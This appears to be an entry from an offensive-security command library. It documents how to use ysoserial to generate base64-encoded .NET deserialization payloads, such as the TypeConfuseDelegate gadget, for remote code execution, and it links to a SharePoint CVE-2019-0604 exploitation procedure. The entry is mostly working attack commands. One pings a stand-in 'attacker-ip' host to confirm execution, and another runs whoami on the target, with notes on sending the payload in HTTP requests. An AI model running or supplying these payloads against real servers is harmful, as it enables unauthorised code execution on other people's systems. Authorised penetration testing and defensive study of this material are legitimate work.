---
id: cmd-ysoserial-generate
data: ysoserial.exe -g TypeConfuseDelegate -c "ping -n 1 attacker-ip" -o base64
tags:
  - rce
  - deserialization
type: command
output: null
executor: bash
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.281Z'
verified: false
validated: true
submitted: true
---
# generate-ysoserial-payload

## Command

```bash
ysoserial.exe -g TypeConfuseDelegate -c "ping -n 1 attacker-ip" -o base64
```

## Description

Generates a base64-encoded .NET deserialization payload using ysoserial to exploit gadgets like TypeConfuseDelegate, executing a specified command (e.g., ping for RCE verification) when deserialized on a vulnerable server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-g, --gadget` | Gadget chain type (e.g., TypeConfuseDelegate for SharePoint) | Yes |
| `-c, --command` | Command to execute on target (e.g., ping for test) | Yes |
| `-o, --output` | Output format (base64 for HTTP transmission) | Yes |

## Examples

### Basic Usage

```bash
ysoserial.exe -g TypeConfuseDelegate -c "ping -n 1 192.168.1.100" -o base64
```

### Advanced Usage

```bash
ysoserial.exe -g WindowsIdentity -c "whoami > C:\temp\whoami.txt" -o raw
```

## Expected Output

Base64 string representing the serialized payload, e.g., "AAEAAAD..." which can be piped to a file or directly used in requests.

## Related

- [[procedures/Exploit-Deserialization-RCE-CVE-2019-0604]]
